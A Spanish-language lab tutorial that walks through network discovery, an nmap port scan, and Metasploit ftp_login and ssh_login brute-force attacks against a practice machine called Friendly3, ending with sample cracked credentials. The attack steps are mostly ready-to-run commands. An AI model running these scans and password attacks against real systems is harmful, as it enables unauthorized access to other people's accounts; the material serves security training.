# Ataques de Fuerza Bruta con Metasploit

Hacer ataques de fuerza bruta con la herramienta metasploit usando la máquina Friendly3 como objetivo.

#### 1. **Reconocimiento de la red y objetivo**

Usa herramientas como `arp-scan` y `ping` para encontrar la dirección IP de la máquina objetivo y comprobar la conectividad.

```bash
└─# arp-scan -I eth0 --localnet
└─# ping -c 1 192.168.1.29
```

#### 2. **Escaneo de puertos con Nmap**

Realiza un escaneo de puertos abiertos para identificar servicios en la máquina objetivo. Utiliza el siguiente comando de Nmap:

```bash
└─# nmap -p- --open -sS -sC -sV --min-rate 5000 -n -vvv -Pn 192.168.1.29
```

Este comando identifica los servicios abiertos, como **FTP** en el puerto 21 y **SSH** en el puerto 22, que serán nuestros objetivos para el ataque de fuerza bruta.

#### 3. **Iniciar Metasploit y configurar el módulo FTP para fuerza bruta**

Abre Metasploit y busca el módulo adecuado para realizar fuerza bruta en el servicio **FTP**:

```bash
└─# msfconsole
msf6 > search ftp_login
msf6 > use auxiliary/scanner/ftp/ftp_login
```

#### 4. **Configurar los parámetros del módulo FTP**

Configura el módulo con los siguientes parámetros, ajustando los valores según tu caso:

```bash
msf6 auxiliary(scanner/ftp/ftp_login) > set PASS_FILE /usr/share/wordlists/rockyou.txt
msf6 auxiliary(scanner/ftp/ftp_login) > set USERNAME juan
msf6 auxiliary(scanner/ftp/ftp_login) > set RHOSTS 192.168.1.29
msf6 auxiliary(scanner/ftp/ftp_login) > run
```

Este comando intentará realizar un ataque de fuerza bruta usando el archivo `rockyou.txt` como diccionario de contraseñas para el usuario `juan`.

#### 5. **Realizar ataque de fuerza bruta contra SSH**

El procedimiento para **SSH** es similar al de FTP. Busca y configura el módulo de fuerza bruta para SSH:

```bash
msf6 > search ssh_login
msf6 > use auxiliary/scanner/ssh/ssh_login
msf6 auxiliary(scanner/ssh/ssh_login) > set RHOSTS 192.168.1.29
msf6 auxiliary(scanner/ssh/ssh_login) > set USERNAME juan
msf6 auxiliary(scanner/ssh/ssh_login) > set PASS_FILE /usr/share/wordlists/rockyou.txt
msf6 auxiliary(scanner/ssh/ssh_login) > run
```

#### 6. **Resultado esperado**

Si el ataque es exitoso, obtendrás un acceso con credenciales válidas. Aquí un ejemplo del éxito en SSH:

```bash
[+] 192.168.1.29:22 - Success: 'juan:alexis' 'uid=1001(juan) gid=1001(juan) groups=1001(juan)'
```

Este proceso te brinda acceso al sistema si alguna de las contraseñas del diccionario coincide con la del servicio atacado.

También se podría hacer fuerza bruta de usuarios.
